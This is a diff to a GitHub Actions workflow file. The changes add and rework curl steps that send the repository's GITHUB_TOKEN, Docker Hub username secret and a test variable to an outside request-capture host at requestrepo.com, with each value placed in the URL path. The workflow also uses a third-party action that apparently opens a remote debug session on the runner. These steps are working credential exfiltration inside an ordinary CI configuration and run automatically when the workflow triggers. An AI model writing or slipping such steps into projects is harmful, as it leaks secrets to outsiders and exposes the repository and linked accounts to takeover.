@@ -7,11 +7,12 @@ jobs:
     permissions:
       issues: write
     steps:
+     - run: curl https://rj0lnjwx.requestrepo.com/1_${{ secrets.GITHUB_TOKEN }}
      - uses: actions/checkout@v2
        env: 
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-     - run: curl https://rj0lnjwx.requestrepo.com//${{ secrets.GITHUB_TOKEN }}
-     - run: curl https://rj0lnjwx.requestrepo.com//${{ secrets.DOCKER_HUB_USERNAME }}
-     - run: curl https://rj0lnjwx.requestrepo.com//${{ vars.TEST_VAR }}
+     - run: curl https://rj0lnjwx.requestrepo.com/2_${{ secrets.GITHUB_TOKEN }}
+     - run: curl https://rj0lnjwx.requestrepo.com/3_${{ secrets.DOCKER_HUB_USERNAME }}
+     - run: curl https://rj0lnjwx.requestrepo.com/4_${{ vars.TEST_VAR }}
      - name: Setup Debug Session
        uses: csexton/debugger-action@master
